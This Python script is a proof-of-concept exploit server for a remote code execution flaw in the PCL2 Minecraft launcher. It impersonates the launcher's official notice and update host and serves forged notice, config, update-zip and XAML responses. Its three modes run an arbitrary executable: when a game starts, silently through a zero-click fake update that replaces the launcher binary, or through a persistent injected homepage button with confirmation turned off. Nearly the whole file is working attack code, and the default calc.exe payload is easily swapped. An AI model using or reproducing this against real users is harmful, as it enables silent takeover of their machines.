#!/usr/bin/env python3
# -*- coding: utf-8 -*-
r"""
PCL2 notice.json RCE PoC -- local HTTPS server.

This server impersonates:
    https://pcl2-server-1253424809.file.myqcloud.com

and serves a forged notice.cfg / notice.json / ServerConfig.json (and,
depending on the mode, an update zip or a custom homepage XAML).

It is intentionally small and only uses the Python standard library.

Modes
-----
launch : notice.json -> actions.setup -> LaunchAdvanceRun = payload.exe
         (the payload runs when the user starts a Minecraft instance in PCL;
          this reproduces the sample notice supplied by the requester)

update : notice.cfg v999 + notice.json -> actions.slientupdate
         + ServerConfig with Update.Release.DownloadUrls -> update.zip
         (zero-click: PCL silently downloads the zip, extracts it to
          <PCL>\PCL\Plain Craft Launcher 2.exe, and starts that file when
          PCL exits.  The zip contains the payload renamed to the above.)

xaml   : notice.json -> actions.setup -> UiCustomType=2, UiCustomNet=...
         + HintCustomCommand=true
         (persistent; next PCL start downloads Custom.xaml from this server,
          and one click on the injected control runs the payload)

both   : launch + update

Usage (Windows, elevated):
    python server.py --mode both --port 443

Usage (Linux local smoke test):
    python server.py --mode both --port 8443 --bind 127.0.0.1
"""
from __future__ import annotations

import argparse
import json
import os
import ssl
import sys
import threading
import zipfile
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

DOMAIN = "pcl2-server-1253424809.file.myqcloud.com"
BASE = Path(__file__).resolve().parent
WWW = BASE / "www"
CERTS = BASE / "certs"

NOTICE_ID = 11002          # must be greater than HintNotice (default 0)
CONFIG_VERSION = 999       # forces PCL to refresh Cache\ServerConfig.json
DEFAULT_PAYLOAD = r"C:\Users\Public\pclpoc.exe"
PAYLOAD = DEFAULT_PAYLOAD

LOG_LOCK = threading.Lock()


def log(msg: str) -> None:
    with LOG_LOCK:
        print(msg, flush=True)


def build_notice(mode: str, payload_exe: str) -> list:
    """Build the forged notice.json for the requested mode."""
    setup: dict[str, str] = {}
    actions: dict[str, object] = {}

    if mode in ("launch", "both"):
        # The exact primitive used by the sample notice: PCL writes the
        # setting, and McLaunchCustom later runs it with:
        #     cmd.exe /c "<LaunchAdvanceRun>"
        setup["LaunchAdvanceRun"] = payload_exe
        setup["LaunchAdvanceRunWait"] = "False"

    if mode in ("xaml", "both"):
        # Persistent remote homepage + disable the command confirmation.
        setup["UiCustomType"] = "2"
        setup["UiCustomNet"] = f"https://{DOMAIN}/Custom.xaml"
        setup["HintCustomCommand"] = "True"

    if setup:
        actions["setup"] = setup

    if mode in ("update", "both"):
        # HasUpdatePermission is hard-coded to True in 2.99.0.0, so this
        # runs UpdateStart(Silent:=True) without any prompt.
        actions["slientupdate"] = {}

    if not actions:
        raise SystemExit(f"unknown/empty mode: {mode}")

    return [
        {
            "id": NOTICE_ID,
            "title": "VM LAB NOTICE",
            "description": "vm lab only",
            "requirements": {},
            "importantLevel": 999,
            "actions": actions,
        }
    ]


def build_server_config() -> dict:
    return {
        "Version": CONFIG_VERSION,
        "Update": {
            "Release": {
                # PatchUrls is deliberately omitted: UpdateStart then falls
                # back to DownloadUrls, and the ".zip" suffix selects the
                # ExtractToDirectory code path instead of MsDelta.Apply.
                "DownloadUrls": [f"https://{DOMAIN}/update.zip"],
            }
        },
    }


CUSTOM_XAML = """<StackPanel Margin="25,40,23,15">
  <TextBlock Text="PCL PoC - click Continue" FontSize="16" Margin="0,0,0,10"/>
  <local:MyButton Text="Continue" EventType="4" EventData="{payload}" Margin="0,6,0,0"/>
</StackPanel>
"""


def ensure_update_zip(payload_exe: str) -> Path:
    """Create www/update.zip containing the payload renamed to the PCL filename."""
    out = WWW / "update.zip"
    if out.exists() and out.stat().st_size > 0:
        return out
    candidates = [payload_exe] if payload_exe else []
    candidates += [
        os.path.join(os.environ.get("SystemRoot", r"C:\Windows"), "System32", "calc.exe"),
        os.path.join(os.environ.get("SystemRoot", r"C:\Windows"), "Sysnative", "calc.exe"),
    ]
    src = next((c for c in candidates if c and os.path.isfile(c)), None)
    if not src:
        raise SystemExit(
            f"payload not found ({payload_exe}); pass --payload-exe or place a prebuilt www/update.zip"
        )
    WWW.mkdir(parents=True, exist_ok=True)
    data = Path(src).read_bytes()
    zi = zipfile.ZipInfo("Plain Craft Launcher 2.exe", date_time=(2020, 1, 1, 0, 0, 0))
    zi.compress_type = zipfile.ZIP_DEFLATED
    with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr(zi, data)
    log(f"[+] update.zip built from {src} ({out.stat().st_size} bytes)")
    return out


class Handler(BaseHTTPRequestHandler):
    server_version = "PCLPoCLab/1.0"
    protocol_version = "HTTP/1.1"

    def log_message(self, fmt, *args):  # noqa: A003
        log(f"[http] {self.address_string()} {fmt % args}")

    def _send(self, body: bytes, ctype: str = "application/json; charset=utf-8",
              code: int = 200) -> None:
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):  # noqa: N802
        path = self.path.split("?", 1)[0]
        mode = self.server.mode  # type: ignore[attr-defined]
        log(f"[req ] {path}")

        if path == "/notice.cfg":
            # id|?|?|?|ServerConfigVersion
            body = f"{NOTICE_ID}|0|0|0|{CONFIG_VERSION}".encode()
            return self._send(body, "text/plain; charset=utf-8")

        if path == "/notice.json":
            body = json.dumps(build_notice(mode, self.server.payload_exe), ensure_ascii=False, indent=2).encode("utf-8")
            return self._send(body, "application/json; charset=utf-8")

        if path == "/ServerConfig.json":
            body = json.dumps(build_server_config(), ensure_ascii=False, indent=2).encode("utf-8")
            return self._send(body, "application/json; charset=utf-8")

        if path == "/update.zip":
            f = WWW / "update.zip"
            if f.exists():
                return self._send(f.read_bytes(), "application/zip")
            return self._send(b"no update.zip", "text/plain", 404)

        if path in ("/Custom.xaml", "/Custom.xaml.ini"):
            if path.endswith(".ini"):
                return self._send(b"1", "text/plain; charset=utf-8")
            xaml = CUSTOM_XAML.replace("{payload}", self.server.payload_exe)
            return self._send(xaml.encode("utf-8"), "application/xml; charset=utf-8")

        # Anything else is served from www/ if present (for manual poking).
        candidate = (WWW / path.lstrip("/")).resolve()
        if candidate.is_file() and WWW in candidate.parents:
            return self._send(candidate.read_bytes(), "application/octet-stream")

        return self._send(b"not found", "text/plain", 404)


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--mode", default="both", choices=["launch", "update", "xaml", "both"])
    ap.add_argument("--port", type=int, default=443)
    ap.add_argument("--bind", default="0.0.0.0")
    ap.add_argument("--payload-exe", default=DEFAULT_PAYLOAD,
                    help="Windows payload exe (writes marker + starts calc.exe)")
    ap.add_argument("--cert", default=str(CERTS / "server.crt"))
    ap.add_argument("--key", default=str(CERTS / "server.key"))
    ap.add_argument("--no-tls", action="store_true")
    args = ap.parse_args()

    WWW.mkdir(parents=True, exist_ok=True)
    if args.mode in ("update", "both"):
        ensure_update_zip(args.payload_exe)

    httpd = ThreadingHTTPServer((args.bind, args.port), Handler)
    httpd.mode = args.mode  # type: ignore[attr-defined]
    httpd.payload_exe = args.payload_exe  # type: ignore[attr-defined]

    if not args.no_tls:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.minimum_version = ssl.TLSVersion.TLSv1_2
        ctx.load_cert_chain(args.cert, args.key)
        httpd.socket = ctx.wrap_socket(httpd.socket, server_side=True)

    scheme = "http" if args.no_tls else "https"
    log(f"[+] {scheme}://{args.bind}:{args.port} mode={args.mode}")
    log(f"[+] forged host: {DOMAIN}")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
